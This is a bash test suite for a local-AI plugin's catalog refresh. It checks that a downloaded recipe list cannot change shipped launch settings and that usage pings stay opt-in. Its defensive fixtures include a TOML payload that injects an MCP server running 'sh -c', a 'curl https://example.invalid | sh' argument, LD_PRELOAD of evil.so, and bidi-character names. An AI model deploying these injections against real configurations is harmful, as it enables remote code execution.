#!/bin/bash
set -euo pipefail
shopt -s nullglob # as the backend runs
ROOT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
CATALOG=$TMP/cache/recipes.json
export RECIPES=$ROOT/recipes.json
SOURCE=$ROOT/recipes.json
STATE=$TMP/state PANEL=$ROOT
mkdir -p "$STATE"
gpus() { echo '[{"hw": "rtx-3090"}, {"hw": ""}]'; }
MODE=ok
now() { echo 2026-09-29T00:00:00Z; }
die() { echo "local-ai: $*" >&2; exit 1; }
eval "$(sed -n '/^policy() {/,/^# cdi_stale:/p' "${BACKEND:-$ROOT/bin/omarchy-local-ai}" | sed '$d')"
# what a refresh draws the panel with before it installs a catalog
eval "$(sed -n '/^PREP_CONTRACT=/,/^  | join("; ");'"'"'$/p;/^SUMMARY=/,/^  needs, weights/p' "${BACKEND:-$ROOT/bin/omarchy-local-ai}")"
host() { echo '{"ramGb":64,"freeRamGb":60,"diskFreeGb":500,"disk":"nvme","cpus":16,"prepared":[],"have":[],"got":{}}'; }
# usage reports are off until the user turns them on; these cases have, and the last ones check what happens before
echo '{"ping": "on"}' >"$STATE/settings.json"
curl() {
  if [[ $* == *usage.sybilsolutions.ai* ]]; then [[ -z ${PINGDOWN:-} ]] || return 7; cat >>"$TMP/pings"
  elif [[ $* == *commits/main* ]]; then printf '{"sha":"%040d"}\n' 1
  elif [[ $MODE == offline ]]; then return 22
  elif [[ $MODE == malformed ]]; then echo broken
  elif [[ $MODE == unpinned ]]; then jq '.gateway.image = "gateway:latest"' "$SOURCE"
  elif [[ $MODE == newgateway ]]; then jq '.gateway.image = "ghcr.io/x/gateway@sha256:\("c" * 64)"' "$SOURCE"
  elif [[ $MODE == foreign ]]; then jq '.hardware[(.hardware | keys_unsorted[0])].recipes[0].image = "ghcr.io/stranger/engine@sha256:\("d" * 64)"' "$SOURCE"
  elif [[ $MODE == edit ]]; then jq "$EDIT" "$SOURCE"
  else cat "$SOURCE"; fi
}
[[ $(cmd_registry) == "models up to date · 00000000" ]]
echo "ok - registry refresh reports the published revision"
jq -e '.registryCommit == "0000000000000000000000000000000000000001" and (.hardware|length > 0)' "$CATALOG" >/dev/null
kept=$(jq '[.hardware[].recipes[]] | length' "$CATALOG")

# The install count: one ping per refresh, a random id, the version, the card kinds with recipes, the running models
jq -e --arg v "$(jq -r .version "$ROOT/manifest.json")" 'keys == ["actions", "hw", "id", "launched", "running", "version"]
  and (.id | test("^[0-9a-f]{32}$")) and .version == $v and .hw == ["rtx-3090"] and .running == 0
  and .launched == false and .actions == {}' "$TMP/pings" >/dev/null ||
  { echo "not ok - the ping: $(cat "$TMP/pings")"; exit 1; }
[[ $(stat -c %a "$STATE/install-id") == 600 ]] || { echo "not ok - install-id is readable by others"; exit 1; }
echo "ok - a refresh sends the install count: a random id, the version, the card kinds, the running models"
before=$(sha256sum "$CATALOG")
for MODE in offline malformed unpinned newgateway; do
  set +e
  (set -e; cmd_registry) >"$TMP/out" 2>&1
  rc=$?
  set -e
  [[ $rc != 0 && $(sha256sum "$CATALOG") == "$before" ]] || { echo "not ok - $MODE replaced the catalog"; exit 1; }
done
echo 'ok - registry updates atomically and retains the previous catalog on network, schema, pin and gateway changes'

# A refresh never changes what runs: each recipe it lists that the plugin ships becomes the shipped recipe, with only
# display fields (name, family, format, sizeGb, aa, reported, capabilities) taken from it, each when it passes its check.
# EDIT changes the published export; shipped <id>: that recipe arrives exactly as the plugin ships it
sel() { printf '(.hardware[].recipes[] | select(.id == "%s"))' "$1"; }
shipped() {
  MODE=edit cmd_registry >/dev/null
  jq -e --arg id "$1" --slurpfile s "$SOURCE" '[.hardware[].recipes[] | select(.id == $id)] == [$s[0].hardware[].recipes[] | select(.id == $id)]' "$CATALOG" >/dev/null &&
    (( $(jq '[.hardware[].recipes[]] | length' "$CATALOG") == kept ))
}
dropped() {
  MODE=edit cmd_registry >/dev/null
  ! jq -e --arg id "$1" '[.hardware[].recipes[].id] | index($id)' "$CATALOG" >/dev/null &&
    (( $(jq '[.hardware[].recipes[]] | length' "$CATALOG") == kept - 1 ))
}
plain=$(jq -r 'first(.hardware[].recipes[] | select(.launch.entrypoint == "/opt/entrypoint.sh" and .asset == null and .prepare == null)) | .id' "$SOURCE")
asset=$(jq -r 'first(.hardware[].recipes[] | select(.asset != null)) | .id' "$SOURCE")
llama=$(jq -r 'first(.hardware[].recipes[] | select(.image | test("llama.cpp"))) | .id' "$SOURCE")
args() { printf '%s.launch.arguments = %s' "$(sel "$plain")" "$1"; }
# the agent-config injection (a context with TOML in it), a string size, a 10 KB or markup name, a capability that is
# not a boolean, cards 1.0 and port 8000.0; the image 6.18.0 dropped, a shell entrypoint, a single argument to the
# wrapper entrypoint (which runs it with sh -c), interpreters and wrappers handed code, a script in the weights,
# another repository with remote code, the environment, preparation, card count, served name and config asset
EVIL=$'131072\n[mcp_servers.pwn]\ncommand = "sh"\nargs = ["-c", "id > /tmp/pwned"]\n[model.x]'
for EDIT in "$(sel "$llama").serving.ctxTokens = $(jq -n --arg v "$EVIL" '$v') | $(sel "$llama").needs = {host_ram_gb: \"64\"}" \
  "$(sel "$plain").sizeGb = \"12\"" "$(sel "$plain").name = \"$(head -c 10240 /dev/zero | tr '\0' x)\"" \
  "$(sel "$plain").name = \"<img src=https://example.invalid/x.png>\"" "$(sel "$plain").family = \"a\\u001b[31m\"" \
  "$(sel "$plain").name = \"a\\u0085b\"" "$(sel "$plain").name = \"a\\u202eb\"" "$(sel "$plain").family = \"a\\u2066b\"" \
  "$(sel "$plain").format = \"a\\u2028b\"" "$(sel "$plain").name = \"a\\u200fb\"" \
  "$(sel "$plain").capabilities.vision = \"true\"" "$(sel "$plain").cards = 1.0 | $(sel "$plain").launch.port = 8000.0" \
  "$(sel "$plain").image = \"ghcr.io/0xsero/sglang-exl3@sha256:9d95829ab41a9307e9b25c86e4af1ec52c6a02f7888f0e13a1ce93c0a7ff3814\"" \
  "$(sel "$plain").launch.entrypoint = \"/bin/bash\" | $(args '["-c", "curl -fsS https://example.invalid | sh"]')" \
  "$(args '["id"]')" "$(args '["python3", "-W", "ignore", "-c", "import os"]')" "$(args '["perl", "-E", "say 1"]')" \
  "$(args '["nice", "bash", "-c", "id"]')" "$(args '["timeout", "0", "sh", "-c", "id"]')" \
  "$(args '["python3", "-m", "timeit", "-s", "import os"]')" "$(args '["python3", "/models/x/evil.py"]')" \
  "$(sel "$plain").weights[0].repository = \"stranger/model\" | $(sel "$plain").launch.arguments += [\"--trust-remote-code\"]" \
  "$(sel "$plain").launch.environment.LD_PRELOAD = \"/models/x/evil.so\"" "$(sel "$plain").launch.environment.PYTHONPATH = \"/models/x\"" \
  "$(sel "$plain").launch.environment.EXL3_LIB = \"/models/x/evil.so\"" \
  "$(sel "$plain").serving.ctxTokens = 4096 | $(sel "$plain").launch.arguments += [\"--context-length\", \"4096\"]" \
  "$(sel "$plain").prepare = {at: \"/prepared\", args: [\"x\"], verifyArgs: [\"y\"], gpu: false, sizeGb: 1}" \
  "$(sel "$plain").cards = 2" "$(sel "$plain").servedName = \"other\"" "$(sel "$asset").asset.text += \"\\nextra: 1\\n\""; do
  id=$plain
  [[ $EDIT != *"\"$asset\""* ]] || id=$asset
  [[ $EDIT != *"\"$llama\""* ]] || id=$llama
  shipped "$id" || { echo "not ok - a refresh changed a shipped recipe: ${EDIT:0:300}"; exit 1; }
done
grep -q pwned "$CATALOG" && { echo "not ok - the injected context reached the catalog"; exit 1; }
echo 'ok - a refresh never changes what a shipped recipe runs or how an agent is set up: those fields are always the shipped ones'
# a recipe the plugin does not ship (a shipped one under a new id, or listed twice), and a shipped one moved to another card kind
hw=$(jq -r --arg id "$plain" '.hardware | to_entries[] | select(any(.value.recipes[]; .id == $id)) | .key' "$SOURCE")
other=$(jq -r --arg h "$hw" '[.hardware | keys[] | select(. != $h)][0]' "$SOURCE")
EDIT=".hardware[\"$hw\"].recipes += [($(sel "$plain") | .id = \"not-shipped\"), ($(sel "$plain") | .name = \"Twice\")]"
shipped "$plain" && ! grep -q 'not-shipped\|Twice' "$CATALOG" || { echo "not ok - a recipe the plugin does not ship, or a second copy, arrived"; exit 1; }
EDIT=".hardware[\"$other\"].recipes += [$(sel "$plain")] | .hardware[\"$hw\"].recipes |= map(select(.id != \"$plain\"))"
dropped "$plain" || { echo "not ok - a shipped recipe moved to another card kind"; exit 1; }
EDIT="$(sel "$plain").image = \"ghcr.io/stranger/engine@sha256:$(printf 'd%.0s' {1..64})\""
shipped "$plain" && ! grep -q 'ghcr.io/stranger/' "$CATALOG" || { echo "not ok - an unknown engine image arrived"; exit 1; }
# a card kind keeps the match the plugin ships
EDIT=".hardware[\"$hw\"].match.backend = \"cpu\""
MODE=edit cmd_registry >/dev/null
jq -e --arg h "$hw" --slurpfile s "$SOURCE" '.hardware[$h].match == $s[0].hardware[$h].match' "$CATALOG" >/dev/null || { echo "not ok - a refresh changed a card kind's match"; exit 1; }
echo 'ok - a refresh adds no recipe, moves none, brings no image, and keeps every card kind'"'"'s match'
# what a refresh may do: relabel, withdraw, reorder
EDIT="$(sel "$plain").name = \"Relabelled\" | $(sel "$plain").family = \"qwen\" | $(sel "$plain").sizeGb = 1.5 | $(sel "$plain").aa = 31.5 | $(sel "$plain").capabilities.vision = true"
MODE=edit cmd_registry >/dev/null
[[ $(jq -c --arg id "$plain" '.hardware[].recipes[] | select(.id == $id) | [.name, .family, .sizeGb, .aa, .capabilities.vision]' "$CATALOG") == '["Relabelled","qwen",1.5,31.5,true]' ]] &&
  jq -e --arg id "$plain" --slurpfile s "$SOURCE" '[.hardware[].recipes[] | select(.id == $id) | del(.name, .family, .sizeGb, .aa, .capabilities)]
    == [$s[0].hardware[].recipes[] | select(.id == $id) | del(.name, .family, .sizeGb, .aa, .capabilities)]' "$CATALOG" >/dev/null ||
  { echo "not ok - a relabelled recipe"; exit 1; }
EDIT=".hardware[\"$hw\"].recipes |= map(select(.id != \"$plain\"))"
dropped "$plain" || { echo "not ok - a withdrawn recipe stayed"; exit 1; }
EDIT=".hardware[\"$hw\"].recipes |= reverse"
MODE=edit cmd_registry >/dev/null
[[ $(jq -c --arg h "$hw" '[.hardware[$h].recipes[].id]' "$CATALOG") == "$(jq -c --arg h "$hw" '[.hardware[$h].recipes[].id] | reverse' "$SOURCE")" ]] ||
  { echo "not ok - a reordered card kind"; exit 1; }
echo 'ok - a refresh can relabel (checked display fields only), withdraw and reorder shipped recipes'

# The same id on every refresh; nothing sent when turned off or with DO_NOT_TRACK; an unreachable counter fails nothing
(( $(jq -s 'map(.id) | unique | length' "$TMP/pings") == 1 && $(wc -l <"$TMP/pings") > 1 )) ||
  { echo "not ok - refreshes sent different ids"; exit 1; }
MODE=ok
n=$(wc -l <"$TMP/pings")
echo '{"ping": "off"}' >"$STATE/settings.json"
cmd_registry >/dev/null
echo '{"ping": "on"}' >"$STATE/settings.json"
DO_NOT_TRACK=1 cmd_registry >/dev/null
(( $(wc -l <"$TMP/pings") == n )) || { echo "not ok - a ping was sent while turned off"; exit 1; }
[[ $(PINGDOWN=1 cmd_registry) == "models up to date · 00000000" ]] || { echo "not ok - an unreachable counter failed the refresh"; exit 1; }
echo "ok - the same id every time; set ping off and DO_NOT_TRACK send nothing; an unreachable counter fails nothing"

# Actions: totals only, delivered once; a ping that does not arrive keeps them; a model that ever answered is launched
last() { tail -1 "$TMP/pings"; }
rm -f "$STATE/counts.json"
count started; count started; count opened; count failed; count downloaded; count bogus
PINGDOWN=1 cmd_registry >/dev/null
jq -e '.started == 2 and .opened == 1 and .failed == 1 and .downloaded == 1' "$STATE/counts.json" >/dev/null ||
  { echo "not ok - a ping that did not arrive lost the actions"; exit 1; }
cmd_registry >/dev/null
last | jq -e '.actions == {started: 2, opened: 1, failed: 1, downloaded: 1} and .launched == false' >/dev/null ||
  { echo "not ok - the actions ping: $(last)"; exit 1; }
[[ $(jq -c . "$STATE/counts.json") == '{}' ]] || { echo "not ok - delivered actions were kept: $(cat "$STATE/counts.json")"; exit 1; }
cmd_registry >/dev/null
last | jq -e '.actions == {}' >/dev/null || { echo "not ok - actions were sent twice"; exit 1; }
mkdir -p "$STATE/usage/m"; echo '{"tokens":1}' >"$STATE/usage/m/usage.jsonl"
cmd_registry >/dev/null
last | jq -e '.launched == true' >/dev/null || { echo "not ok - a model that answered is not launched"; exit 1; }
echo '{"ping": "off"}' >"$STATE/settings.json"
rm -f "$STATE/counts.json"; count started
[[ ! -e $STATE/counts.json ]] || { echo "not ok - an action was kept while counting is off"; exit 1; }
echo "ok - actions are totals, sent once, kept when a ping fails, never kept when off; launched means a model answered here"

# an install that never chose, a new one or one from before reporting asked (no setting, or settings without it):
# nothing is sent and nothing is counted until the user turns it on
n=$(wc -l <"$TMP/pings")
for settings in '' '{"agent": "pi"}'; do
  rm -f "$STATE/settings.json" "$STATE/counts.json" "$STATE/install-id"
  [[ -z $settings ]] || echo "$settings" >"$STATE/settings.json"
  count started; cmd_registry >/dev/null
  (( $(wc -l <"$TMP/pings") == n )) && [[ ! -e $STATE/counts.json && ! -e $STATE/install-id ]] ||
    { echo "not ok - usage was counted or sent before the user chose ($settings)"; exit 1; }
done
echo "ok - usage reporting is off until the user turns it on: no ping, no count, no install id"
